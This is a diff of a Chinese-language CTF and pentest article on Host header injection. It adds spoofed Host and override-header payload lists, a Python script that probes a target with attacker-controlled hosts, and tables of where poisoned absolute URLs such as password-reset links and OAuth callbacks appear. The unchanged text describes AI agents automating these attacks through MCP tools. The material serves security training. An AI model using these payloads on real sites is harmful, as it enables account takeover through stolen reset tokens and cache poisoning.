@@ -14,7 +14,7 @@ keywords: ["host header attack", "密码重置劫持", "SSRF", "Host注入", "X-
 difficulty: "intermediate"
 tags: ["authentication", "host-header", "ssrf", "web-security", "injection", "ctf"]
 language: "zh-CN"
-last_updated: "2026-06-25"
+last_updated: "2026-07-04"
 related_articles: []
 ---
 
@@ -58,26 +58,69 @@ def hijack_password_reset(target: str):
 ## 2. Host 头注入变体
 
 ```python
-HOST_PAYLOADS = [
-    # 基础
+HOST_VALUES = [
     "attacker.com",
-    # 端口欺骗
     "target.com:1337",
-    # 带凭证
     "target.com@attacker.com",
-    # 子域名欺骗
     "attacker.com#target.com",
     "attacker.com%23target.com",
-    # X-Forwarded-Host (如果后端取这个优先)
-    "attacker.com",
-    # Host override headers
-    "X-Forwarded-Host": "attacker.com",
-    "X-Host": "attacker.com",
-    "X-Forwarded-Server": "attacker.com",
-    "X-HTTP-Host-Override": "attacker.com",
-    "Forwarded": "host=attacker.com",
+    "attacker.com%2ftarget.com",
+    "target.com.evil.com",
+    "localhost",
+    "127.0.0.1",
+    "[::1]",
+]
+
+OVERRIDE_HEADERS = [
+    "X-Forwarded-Host",
+    "X-Host",
+    "X-Forwarded-Server",
+    "X-HTTP-Host-Override",
+    "X-Original-Host",
+    "X-Rewrite-URL",
+    "Forwarded",
 ]
 ```
+
+### 2.1 代理/框架取值优先级
+
+| 层 | 常见取值 | 打点动作 | 命中信号 |
+|---|---|---|---|
+| Web server | `Host` | 改 Host 观察 vhost/跳转 | `Location`、页面标题变化 |
+| 反向代理 | `X-Forwarded-Host` | Host 正常，XFH 改 evil | 生成链接使用 XFH |
+| CDN | `Forwarded: host=` | 加 RFC 7239 header | 缓存 key 或跳转变化 |
+| 应用框架 | `X-Original-Host` / `X-Host` | 多 header 竞争 | 密码重置/回调 URL 变化 |
+| 业务配置 | `base_url` | Header 全改也无效 | 固定域名输出 |
+
+同一个请求里放多个 header 时，要看谁覆盖谁：
+
+```python
+import requests
+
+def host_header_matrix(url, evil="attacker.example"):
+    baseline = requests.get(url, allow_redirects=False)
+    tests = []
+    for header in OVERRIDE_HEADERS:
+        headers = {"Host": "target.example"}
+        if header == "Forwarded":
+            headers[header] = f"host={evil};proto=https"
+        else:
+            headers[header] = evil
+        tests.append((header, headers))
+    tests.append(("Host", {"Host": evil}))
+
+    for name, headers in tests:
+        r = requests.get(url, headers=headers, allow_redirects=False, timeout=8)
+        loc = r.headers.get("Location", "")
+        changed = (r.status_code, loc, len(r.text)) != (
+            baseline.status_code,
+            baseline.headers.get("Location", ""),
+            len(baseline.text),
+        )
+        print(name, r.status_code, changed, loc[:160])
+```
+
+成功样本：`Location`、邮件预览、JSON 中 `baseUrl`、HTML canonical URL、OpenGraph URL、OAuth callback 使用了攻击者 host。失败样本：只返回 `400 Bad Request`，说明 Web server 层已经拦掉，还没进入应用。
 
 ## 3. Host → SSRF 链
 
@@ -113,6 +156,22 @@ for internal in ["127.0.0.1", "localhost", "0.0.0.0", "[::1]", "169.254.169.254"
 # 详见 08-infra/race-cache-smuggling.md
 ```
 
+### 5.1 Absolute URL 生成点
+
+Host 注入不只在密码重置里出现，所有“后端拼绝对 URL”的地方都值得测：
+
+| 功能 | 观察位置 | Payload |
+|---|---|---|
+| 密码重置 | 邮件链接/预览接口 | `Host: attacker.com` |
+| 邮箱验证 | verify link | `X-Forwarded-Host` |
+| OAuth/OIDC | `redirect_uri` / issuer | `Forwarded: host=` |
+| Sitemap/RSS | `<loc>` / feed link | Host/XFH |
+| 文件下载 | signed URL | Host 带端口/协议 |
+| Webhook | callback URL | `X-Forwarded-Proto: http` |
+| Cache | `Location` / canonical | Host 不进 cache key |
+
+如果目标有“发送邮件但看不到邮件”的限制，优先找同功能的预览接口、队列日志、前端 toast、`/api/debug/mail`、管理后台邮件模板记录。
+
 ## 6. 攻击链
 
 ```
@@ -141,9 +200,9 @@ AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
 | Host header 注入探测 | `http_probe` | HTTP GET 探测，验证 Host header 篡改效果 |
 | 路由绕过验证 | `http_probe` | 探测 X-Forwarded-Host/X-Real-IP 等 header 效果 |
 
-## 证据与验证闭环
+## Evidence
 
-- 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
-- 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
-- 固定 session、输入、并发参数和时间窗口重放，记录成功响应、失败样本和下一跳。
-- 输出统一放入 `exports/ctf-website/<case>/`，凭据只用 `REDACTED` 占位，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。
+- 保存 baseline、每个 header 变体、响应状态、`Location`、正文里出现的绝对 URL。
+- 对密码重置/邮箱验证记录：触发请求、邮件/预览里的最终链接、token 所属账号、token 是否可用。
+- 对 cache 场景记录：缓存命中头、cache key 推断、首个投毒请求和后续命中请求。
+- 输出统一放入 `exports/ctf-website/<case>/`，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。
